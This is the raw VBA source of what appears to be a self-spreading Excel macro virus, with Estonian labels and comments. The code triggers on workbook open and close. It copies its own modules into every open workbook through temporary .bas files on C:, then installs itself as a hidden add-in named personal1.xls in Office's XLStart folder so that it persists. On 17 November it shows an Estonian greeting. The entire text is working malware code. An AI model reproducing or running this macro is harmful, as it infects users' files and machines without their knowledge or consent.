   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "code"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = False
   Attribute VB_Exposed = False



   Public WithEvents App As Application
   Attribute App.VB_VarHelpID = -1




   Sub InitializeApp()
       Set X.App = Application
   End Sub


   Private Sub App_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
   code1.algus
   End Sub

   Private Sub App_WorkbookOpen(ByVal Wb As Excel.Workbook)
   code1.algus
   End Sub

   Attribute VB_Name = "code1"
   Dim X As New code

   Sub Auto_Open()
       Set X.App = Application
   If ThisWorkbook.Name = "personal1.xls" Then
   If Windows.Count = "1" Then
   ActiveWindow.Visible = False
   End If
   Workbooks.Add
   End If
   End Sub




   Sub algus()
   If ThisWorkbook.Name = "personal1.xls" Then rot = "1" Else rot = "0"
   o = "0"
   For Each k In Workbooks
   If k.Name = "personal1.xls" Then
   o = "1"
   End If
   Next k
   If o = 0 Then
   If rot = "1" Then GoTo täiskäik
   Workbooks.Add
   ad = ActiveWorkbook.Name
   If ad = "funces.xla" Then GoTo lõpp
   ThisWorkbook.VBProject.VBComponents("code").Export ("c:\1.bas")
   ThisWorkbook.VBProject.VBComponents("code1").Export ("c:\2.bas")
   Workbooks(ad).VBProject.VBComponents.Import ("c:\1.bas")
   Workbooks(ad).VBProject.VBComponents.Import ("c:\2.bas")
   Kill ("C:\1.bas")
   Kill ("C:\2.bas")
   Workbooks(ad).SaveAs FileName:="C:\Program Files\Microsoft Office\Office\XLStart\personal1.xls", FileFormat:=xlAddIn _
   , ConflictResolution:=xlLocalSessionChanges
   ActiveWindow.Visible = False
   GoTo lõpp
   End If
   täiskäik:
   a = Workbooks.Count
   For c = 1 To a                                      'c on workbooki nr
   e = 0
   For Each d In Workbooks(c).VBProject.VBComponents   'module nimi
   f = Workbooks(c).Name                        'f on konr nimi
   If d.Name = "code" Then
   e = 1                              'e inf või ei
   Else
   End If
   Next d
   If e = 1 Then
   Else
   ThisWorkbook.VBProject.VBComponents("code").Export ("c:\1.bas")
   ThisWorkbook.VBProject.VBComponents("code1").Export ("c:\2.bas")
   Workbooks(f).VBProject.VBComponents.Import ("c:\1.bas")
   Workbooks(f).VBProject.VBComponents.Import ("c:\2.bas")
   Kill ("C:\1.bas")
   Kill ("C:\2.bas")
   End If
   Next c
   lõpp:
   mtime = Date
   If Month(mtime) = "11" And Day(mtime) = "17" Then
   MsgBox ("Tere täna on kellegil hea päev")
   End If
   End Sub

   Sub Auto_Close()
   If ThisWorkbook.Name = "personal1.xls" Then
   ThisWorkbook.Close SaveChanges:=False
   End If
   End Sub
